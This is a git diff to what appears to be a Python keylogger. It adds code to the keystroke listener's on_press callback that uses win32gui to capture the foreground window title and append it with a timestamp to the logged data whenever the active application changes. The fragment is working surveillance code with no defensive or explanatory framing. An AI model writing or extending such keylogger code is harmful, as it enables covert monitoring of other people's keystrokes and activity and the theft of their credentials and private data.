@@ -30,6 +30,16 @@ delete_file = []
 def on_press(key):
     global old_app
     new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+    if new_app == 'Cortana':
+        new_app = 'Windows Start Menu'
+    else:
+        pass
+
+    if new_app != old_app and new_app != '':
+        logged_data.append(f'[{datetime}] ~ {new_app}\n')
+        old_app = new_app
+    else:
+        pass
 
 
 with Listener(on_press=on_press) as listener:
